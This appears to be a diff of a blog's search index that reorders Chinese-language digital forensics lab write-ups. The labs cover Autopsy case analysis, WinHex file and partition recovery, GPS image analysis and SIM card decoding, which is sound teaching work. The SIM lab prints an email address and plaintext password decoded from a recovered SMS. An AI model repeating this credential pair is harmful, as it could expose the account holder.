@@ -124,6 +124,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Ddigital-Forensics-Lab-3</title>
+    <url>/posts/2947dde5.html</url>
+    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>学会在kali linux中利用autopsy创建实验案例，并利用autopsy对案例进行分析。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>安装有kali linux的虚拟机、磁盘镜像文件thumbimage_fat.dd。</p>
+<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
+<p>1、打开autopsy取证分析浏览器，<br />
+在管理员权限下运行<code>autospsy</code>，登录：<code>http://localhost:9999/autops</code>。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.1.png" alt="运行程序得到的结果" /></p>
+<p>2、在autopsy中创建新案例，记录下autopsy计算的镜像文件的哈希值。</p>
+<p>案例信息：受攻击web服务器的主机名为<code>www.hacker.ucs.ca</code>，实验中使用的&quot;thumbimage_fat.dd&quot;是在犯罪现场获取的磁盘镜像。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.2.png" alt="计算除MD5哈希值" /></p>
+<p>3、利用autopsy进行电子证据磁盘分析。</p>
+<p>完成创建后，在案例分析中找到keyword<br />
+search，在磁盘镜像中搜索关键字&quot;Wikipedia&quot;,将调查一步一步地深入下去，并回答下列问题。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.3.png" alt="搜索关键字编码为ASCII格式" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.4.png" alt="搜索关键字编码为Unicode格式" /></p>
+<p>问题1：当搜索关键字编码为ASCII格式时，命中次数是多少</p>
+<p>答：1次。</p>
+<p>问题2：关键字结果所在数据单元的编号（或地址）是什么</p>
+<p>答：Unit 8291 (Hex - Ascii)。</p>
+<p>问题3：当搜索关键字编码为Unicode格式时，命中次数是多少</p>
+<p>答：0次。</p>
+]]></content>
+      <categories>
+        <category>计算机取证学</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ddigital-Forensics-Lab-2</title>
     <url>/posts/5d65ccb7.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
@@ -171,72 +204,6 @@
       <tags>
         <tag>Linux</tag>
         <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ddigital-Forensics-Lab-3</title>
-    <url>/posts/2947dde5.html</url>
-    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>学会在kali linux中利用autopsy创建实验案例，并利用autopsy对案例进行分析。</p>
-<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有kali linux的虚拟机、磁盘镜像文件thumbimage_fat.dd。</p>
-<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
-<p>1、打开autopsy取证分析浏览器，<br />
-在管理员权限下运行<code>autospsy</code>，登录：<code>http://localhost:9999/autops</code>。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.1.png" alt="运行程序得到的结果" /></p>
-<p>2、在autopsy中创建新案例，记录下autopsy计算的镜像文件的哈希值。</p>
-<p>案例信息：受攻击web服务器的主机名为<code>www.hacker.ucs.ca</code>，实验中使用的&quot;thumbimage_fat.dd&quot;是在犯罪现场获取的磁盘镜像。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.2.png" alt="计算除MD5哈希值" /></p>
-<p>3、利用autopsy进行电子证据磁盘分析。</p>
-<p>完成创建后，在案例分析中找到keyword<br />
-search，在磁盘镜像中搜索关键字&quot;Wikipedia&quot;,将调查一步一步地深入下去，并回答下列问题。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.3.png" alt="搜索关键字编码为ASCII格式" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.4.png" alt="搜索关键字编码为Unicode格式" /></p>
-<p>问题1：当搜索关键字编码为ASCII格式时，命中次数是多少</p>
-<p>答：1次。</p>
-<p>问题2：关键字结果所在数据单元的编号（或地址）是什么</p>
-<p>答：Unit 8291 (Hex - Ascii)。</p>
-<p>问题3：当搜索关键字编码为Unicode格式时，命中次数是多少</p>
-<p>答：0次。</p>
-]]></content>
-      <categories>
-        <category>计算机取证学</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ddigital-Forensics-Lab-5</title>
-    <url>/posts/179be3c4.html</url>
-    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>使用 winhex 对删除的文件进行恢复。</p>
-<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有 winhex 的 windows 系统、shiyan.vhd 文件。</p>
-<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
-<p>1、将 shiyan.vhd 挂载到C盘。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
-<p>2、找到 MFT 中 paper.zip 的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.2.png" alt="找到 MFT 中 paper.zip 的位置" /></p>
-<p>3、ctrl + f 搜索关键词 paper 。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.3.png" alt="搜索关键词 paper" /></p>
-<p>4、在上方复制并查找16进制数值。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.4.png" alt="复制16进制数值" /></p>
-<p>5、由下图可以获取以下消息：文件大小：1226D8(十进制 1189592)；簇数：1123；首簇号：042D(十进制 1069)。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.5.png" alt="查找16进制数值" /></p>
-<p>6、ctrl + g 搜索首簇号的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.6.png" alt="搜索搜簇号的位置" /></p>
-<p>7、alt + g 输入文件大小查找末bit的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.7.png" alt="查找末bit的位置" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.8.png" alt="末bit的位置" /></p>
-<p>8、保存为paper.zip，解压后发现获得了一个PDF文件，恢复成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.9.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
-]]></content>
-      <categories>
-        <category>计算机取证学</category>
-      </categories>
-      <tags>
-        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -398,41 +365,30 @@ FAT CONTENTS (in sectors)
       </tags>
   </entry>
   <entry>
-    <title>Ddigital-Forensics-Lab-7</title>
-    <url>/posts/f99582e8.html</url>
+    <title>Ddigital-Forensics-Lab-5</title>
+    <url>/posts/179be3c4.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>学会使用 winhex 恢复硬盘分区。</p>
+<p>使用 winhex 对删除的文件进行恢复。</p>
 <h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有 winhex 的 windows 系统、shiyan7.vhd 文件。</p>
+<p>安装有 winhex 的 windows 系统、shiyan.vhd 文件。</p>
 <h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
 <p>1、将 shiyan.vhd 挂载到C盘。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
-<p>2、搜索 NTFS 的 MBR 十六进制特征码 EB5290 。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.2.png" alt="搜索结果" /></p>
-<p>3、分析得第一个扇区的信息：分区大小（在偏移 0x28H处） ：344063（0x53fff），结束扇区（见左下角）：344191（0x54080）；相减得起始扇区：128（80）。同理可得第二个扇区的信息：分区大小：303103（0x49fff） ，结束位置：647295（9e07f），起始扇区：344192（54080）。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.3.png" alt="第一个扇区的信息" /><br />
-<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.4.png" alt="第二个扇区的信息" /></p>
-<p>4、在分区最前面找到分区终止符 55 AA ，在前面修改为正确分区。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.5.png" alt="扇区信息修改前" /><br />
-<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.6.png" alt="扇区信息修改后" /></p>
-<p>5、保存后发现成功分区。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.7.png" alt="磁盘管理显示分区成功" /><br />
-<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.8.png" alt="winhex显示分区成功" /></p>
-<p>6、在第一个分区的 MFT 中 ctrl + f 搜索关键词 abc.txt 。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.9.png" alt="搜索关键词 abc.txt" /></p>
-<p>7、经过尝试发现搜索结果2是有效的。在上方复制并查找16进制数值。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.10.png" alt="查找16进制数值" /></p>
-<p>8、由下图可以获取以下消息：文件大小：1B52(十进制 6994)；簇数：D502；首簇号：07(十进制 07)。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.11.png" alt="获取文件信息" /><br />
-9、ctrl + g 搜索首簇号的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.12.png" alt="搜索搜簇号的位置" /></p>
-<p>10、alt + g 输入文件大小查找末bit的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.13.png" alt="寻找末bit的位置" /><br />
-<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.14.png" alt="末bit的位置" /></p>
-<p>11、保存为abc.txt，恢复成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.15.png" alt="abc.txt的部分内容" /></p>
-<p><a href="https://jingyan.baidu.com/article/a24b33cd4cf08358ff002b3f.html">参考文章1</a><br />
-<a href="http://www.webkaka.com/info/archives/system/2015/05/282147/">参考文章2</a></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
+<p>2、找到 MFT 中 paper.zip 的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.2.png" alt="找到 MFT 中 paper.zip 的位置" /></p>
+<p>3、ctrl + f 搜索关键词 paper 。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.3.png" alt="搜索关键词 paper" /></p>
+<p>4、在上方复制并查找16进制数值。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.4.png" alt="复制16进制数值" /></p>
+<p>5、由下图可以获取以下消息：文件大小：1226D8(十进制 1189592)；簇数：1123；首簇号：042D(十进制 1069)。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.5.png" alt="查找16进制数值" /></p>
+<p>6、ctrl + g 搜索首簇号的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.6.png" alt="搜索搜簇号的位置" /></p>
+<p>7、alt + g 输入文件大小查找末bit的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.7.png" alt="查找末bit的位置" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.8.png" alt="末bit的位置" /></p>
+<p>8、保存为paper.zip，解压后发现获得了一个PDF文件，恢复成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.9.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
 ]]></content>
       <categories>
         <category>计算机取证学</category>
@@ -494,31 +450,41 @@ FAT CONTENTS (in sectors)
       </tags>
   </entry>
   <entry>
-    <title>Ddigital-Forensics-Lab-8</title>
-    <url>/posts/692a9f79.html</url>
+    <title>Ddigital-Forensics-Lab-7</title>
+    <url>/posts/f99582e8.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>认识 GPS 设备中存储的信息，并运用工具进行简单分析。</p>
+<p>学会使用 winhex 恢复硬盘分区。</p>
 <h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有 AccessData FTK Imager、GPX Editor 的 PC、gps.dd.001 文件。</p>
+<p>安装有 winhex 的 windows 系统、shiyan7.vhd 文件。</p>
 <h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
-<p>1、添加 gps.dd.001 的 GPS 设备镜像作为证据项。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.1.png" alt="添加 gps.dd.001" />{width=&quot;10cm&quot;}</p>
-<p>2、导出 GPX 文件。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.2.png" alt="导出 GPX 文件" />{width=&quot;10cm&quot;}</p>
-<p>根据 current.gpx 文件的内容，可以回答以下问题：</p>
-<p>问题 1、在&quot;current.gpx&quot;文件中有多少个航迹点？</p>
-<p>查阅资料可知，航迹点在文本文档中用 &lt;trkpt<br />
-来表示，因此只需要在文本编辑器中搜索 &lt;trkpt 即可得到航迹点的数量。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.3.png" alt="搜索 trkpt" />{width=&quot;10cm&quot;}</p>
-<p>由此可知，在&quot;current.gpx&quot;文件中有7626个航迹点。</p>
-<p>问题 2、在&quot;current.gpx&quot;文件中第一个航迹点的经纬度是多少？</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.4.png" alt="第一个航迹点的经纬度" />{width=&quot;10cm&quot;}</p>
-<p>由此可知，第一个航迹点的维度为43.813697N，经度为79.361316W。</p>
-<p>问题 3、在&quot;current.gpx&quot;文件中有多少个航点？</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.5.png" alt="第一个航迹点的经纬度" />{width=&quot;10cm&quot;}</p>
-<p>由此可知，在&quot;current.gpx&quot;文件中有45个航点。</p>
-<p>问题 4、在&quot;current.gpx&quot;文件中第一个航点的经纬度是多少</p>
-<p>由图 5 可知，第一个航点的纬度为44.133530N，经度为79.131322W。</p>
+<p>1、将 shiyan.vhd 挂载到C盘。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
+<p>2、搜索 NTFS 的 MBR 十六进制特征码 EB5290 。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.2.png" alt="搜索结果" /></p>
+<p>3、分析得第一个扇区的信息：分区大小（在偏移 0x28H处） ：344063（0x53fff），结束扇区（见左下角）：344191（0x54080）；相减得起始扇区：128（80）。同理可得第二个扇区的信息：分区大小：303103（0x49fff） ，结束位置：647295（9e07f），起始扇区：344192（54080）。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.3.png" alt="第一个扇区的信息" /><br />
+<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.4.png" alt="第二个扇区的信息" /></p>
+<p>4、在分区最前面找到分区终止符 55 AA ，在前面修改为正确分区。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.5.png" alt="扇区信息修改前" /><br />
+<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.6.png" alt="扇区信息修改后" /></p>
+<p>5、保存后发现成功分区。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.7.png" alt="磁盘管理显示分区成功" /><br />
+<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.8.png" alt="winhex显示分区成功" /></p>
+<p>6、在第一个分区的 MFT 中 ctrl + f 搜索关键词 abc.txt 。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.9.png" alt="搜索关键词 abc.txt" /></p>
+<p>7、经过尝试发现搜索结果2是有效的。在上方复制并查找16进制数值。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.10.png" alt="查找16进制数值" /></p>
+<p>8、由下图可以获取以下消息：文件大小：1B52(十进制 6994)；簇数：D502；首簇号：07(十进制 07)。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.11.png" alt="获取文件信息" /><br />
+9、ctrl + g 搜索首簇号的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.12.png" alt="搜索搜簇号的位置" /></p>
+<p>10、alt + g 输入文件大小查找末bit的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.13.png" alt="寻找末bit的位置" /><br />
+<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.14.png" alt="末bit的位置" /></p>
+<p>11、保存为abc.txt，恢复成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.15.png" alt="abc.txt的部分内容" /></p>
+<p><a href="https://jingyan.baidu.com/article/a24b33cd4cf08358ff002b3f.html">参考文章1</a><br />
+<a href="http://www.webkaka.com/info/archives/system/2015/05/282147/">参考文章2</a></p>
 ]]></content>
       <categories>
         <category>计算机取证学</category>
@@ -528,31 +494,31 @@ FAT CONTENTS (in sectors)
       </tags>
   </entry>
   <entry>
-    <title>Ddigital-Forensics-Lab-9</title>
-    <url>/posts/1e2dafef.html</url>
+    <title>Ddigital-Forensics-Lab-8</title>
+    <url>/posts/692a9f79.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>了解 SIM 卡中存储的信息，学会对其进行取证分析。</p>
+<p>认识 GPS 设备中存储的信息，并运用工具进行简单分析。</p>
 <h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有 winhex 的 windows 系统、SIM_2G_3G SIM.zip 文件。</p>
+<p>安装有 AccessData FTK Imager、GPX Editor 的 PC、gps.dd.001 文件。</p>
 <h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
-<p>问题<br />
-1、手动在镜像文件中找到最后一个联系人和对应的号码。提示：所有的联系人都存储在基本文件 6F3A 中。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.1.png" alt="最后一个联系人和对应的号码" />{width=&quot;10cm&quot;}</p>
-<p>由此可知，最后一个联系人对应的号码所记录的内容为 0x06810391098011。其中0x06表示电话号码为6个字节，0x81表示该号码是一个未知的电话号码，接下来的 0x0391098011按反向半字节格式存储可知号码为 3019900811。而向上寻找可以得知，联系人姓名为Woody Woolenson。</p>
-<p>问题 2、找到属于 Hanco Car 的号码。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.2.png" alt="无法找到属于 Hanco Car 的号码" />{width=&quot;10cm&quot;}</p>
-<p>无法找到属于 Hanco Car 的号码。</p>
-<p>问题 3、SIM 卡文件系统转储中共包含多少条信息。</p>
-<p>共包含 12+28+2=42 条信息。</p>
-<p>问题 4、对转储的 SIM 卡文件系统中最后一条短信的各部分进行转换，确保解码短信中所有记录。提示：短信在目录 3F00/7F10/下的 6F3C 文件中。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.3.png" alt="最后一条短信" />{width=&quot;10cm&quot;}</p>
-<p>由此可知，最后一条短信为上图所示。其中 0x00 表示该短信为未读状态；0x07 表示接下来七个字节为服务中心号码；0x91 表示接下来是一个国际号码；0x2160130310F2 表示服务中心号码为1206313012；接下来的 0x91 表示接下来是一个国际号码；0x2104374120F2 表示发送者号码为 12407314022；0x00 表示使用默认的 7 位编码来编码短信正文；0x608072615033 表示时间为 2006 年 8 月 27 日，时间为 16:05:33；接下来的内容为短信内容，解码后为Email: <a href="mailto:nuthanhtran@hotmail.com">nuthanhtran@hotmail.com</a> Password: kevinhong</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.4.png" alt="短信内容解码" />{width=&quot;10cm&quot;}</p>
-<p>问题 5、确定文件系统镜像文件中是否包含删除的短信。</p>
-<p>由问题 4 的短信可知，该短信已被删除，因此文件系统镜像文件中包含删除的短信。</p>
-<p>问题 6、这张 SIM 卡的 ICCID 是什么，并对 ICCID 进行简要分析。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.5.png" alt="SIM 卡的 ICCID 内容" />{width=&quot;10cm&quot;}</p>
-<p>由此可知，0x98 表示由全球电信行业分配的标识符；0x012 用于标识 SIM 卡发行的国家；0x602 指示 SIM 卡注册的移动网络；0x012559597 是 SIM 卡的具体序列号；0xF 用于确保 ICCID 的完整性和正确性。</p>
+<p>1、添加 gps.dd.001 的 GPS 设备镜像作为证据项。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.1.png" alt="添加 gps.dd.001" /></p>
+<p>2、导出 GPX 文件。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.2.png" alt="导出 GPX 文件" /></p>
+<p>根据 current.gpx 文件的内容，可以回答以下问题：</p>
+<p>问题 1、在&quot;current.gpx&quot;文件中有多少个航迹点？</p>
+<p>查阅资料可知，航迹点在文本文档中用 &lt;trkpt<br />
+来表示，因此只需要在文本编辑器中搜索 &lt;trkpt 即可得到航迹点的数量。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.3.png" alt="搜索 trkpt" /></p>
+<p>由此可知，在&quot;current.gpx&quot;文件中有7626个航迹点。</p>
+<p>问题 2、在&quot;current.gpx&quot;文件中第一个航迹点的经纬度是多少？</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.4.png" alt="第一个航迹点的经纬度" /></p>
+<p>由此可知，第一个航迹点的维度为43.813697N，经度为79.361316W。</p>
+<p>问题 3、在&quot;current.gpx&quot;文件中有多少个航点？</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.5.png" alt="第一个航迹点的经纬度" /></p>
+<p>由此可知，在&quot;current.gpx&quot;文件中有45个航点。</p>
+<p>问题 4、在&quot;current.gpx&quot;文件中第一个航点的经纬度是多少</p>
+<p>由图 5 可知，第一个航点的纬度为44.133530N，经度为79.131322W。</p>
 ]]></content>
       <categories>
         <category>计算机取证学</category>
@@ -607,6 +573,40 @@ FAT CONTENTS (in sectors)
       </tags>
   </entry>
   <entry>
+    <title>Ddigital-Forensics-Lab-9</title>
+    <url>/posts/1e2dafef.html</url>
+    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>了解 SIM 卡中存储的信息，学会对其进行取证分析。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>安装有 winhex 的 windows 系统、SIM_2G_3G SIM.zip 文件。</p>
+<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
+<p>问题<br />
+1、手动在镜像文件中找到最后一个联系人和对应的号码。提示：所有的联系人都存储在基本文件 6F3A 中。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.1.png" alt="最后一个联系人和对应的号码" /></p>
+<p>由此可知，最后一个联系人对应的号码所记录的内容为 0x06810391098011。其中0x06表示电话号码为6个字节，0x81表示该号码是一个未知的电话号码，接下来的 0x0391098011按反向半字节格式存储可知号码为 3019900811。而向上寻找可以得知，联系人姓名为Woody Woolenson。</p>
+<p>问题 2、找到属于 Hanco Car 的号码。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.2.png" alt="无法找到属于 Hanco Car 的号码" /></p>
+<p>无法找到属于 Hanco Car 的号码。</p>
+<p>问题 3、SIM 卡文件系统转储中共包含多少条信息。</p>
+<p>共包含 12+28+2=42 条信息。</p>
+<p>问题 4、对转储的 SIM 卡文件系统中最后一条短信的各部分进行转换，确保解码短信中所有记录。提示：短信在目录 3F00/7F10/下的 6F3C 文件中。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.3.png" alt="最后一条短信" /></p>
+<p>由此可知，最后一条短信为上图所示。其中 0x00 表示该短信为未读状态；0x07 表示接下来七个字节为服务中心号码；0x91 表示接下来是一个国际号码；0x2160130310F2 表示服务中心号码为1206313012；接下来的 0x91 表示接下来是一个国际号码；0x2104374120F2 表示发送者号码为 12407314022；0x00 表示使用默认的 7 位编码来编码短信正文；0x608072615033 表示时间为 2006 年 8 月 27 日，时间为 16:05:33；接下来的内容为短信内容，解码后为Email: <a href="mailto:nuthanhtran@hotmail.com">nuthanhtran@hotmail.com</a> Password: kevinhong</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.4.png" alt="短信内容解码" /></p>
+<p>问题 5、确定文件系统镜像文件中是否包含删除的短信。</p>
+<p>由问题 4 的短信可知，该短信已被删除，因此文件系统镜像文件中包含删除的短信。</p>
+<p>问题 6、这张 SIM 卡的 ICCID 是什么，并对 ICCID 进行简要分析。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.5.png" alt="SIM 卡的 ICCID 内容" /></p>
+<p>由此可知，0x98 表示由全球电信行业分配的标识符；0x012 用于标识 SIM 卡发行的国家；0x602 指示 SIM 卡注册的移动网络；0x012559597 是 SIM 卡的具体序列号；0xF 用于确保 ICCID 的完整性和正确性。</p>
+]]></content>
+      <categories>
+        <category>计算机取证学</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Digital-Currency-and-Blockchain-Lab-2</title>
     <url>/posts/661cdd66.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
@@ -642,6 +642,68 @@ ecc-pycrypto 库中的 P256 椭圆曲线的一个简单实现。</p>
